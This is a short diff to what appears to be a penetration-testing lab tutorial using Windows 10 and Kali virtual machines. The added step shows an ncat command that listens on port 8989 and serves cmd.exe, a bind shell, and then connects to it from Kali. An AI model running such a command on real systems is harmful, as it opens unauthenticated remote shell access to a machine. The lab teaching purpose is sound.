@@ -132,4 +132,10 @@ cd C:\ophcrack\fgdump-2.1.0
 ```
 ncat -h
 ```
-3. Run ncat to se
+3. Run ncat to listen on port 8989. If anyone connects to that port, it will run the command prompt program
+```
+ncat -l -p 8989 -e cmd.exe
+```
+
+**On Kali VM**
+4. Run netcat to connect to the listening netcat on Win10 on port 8989
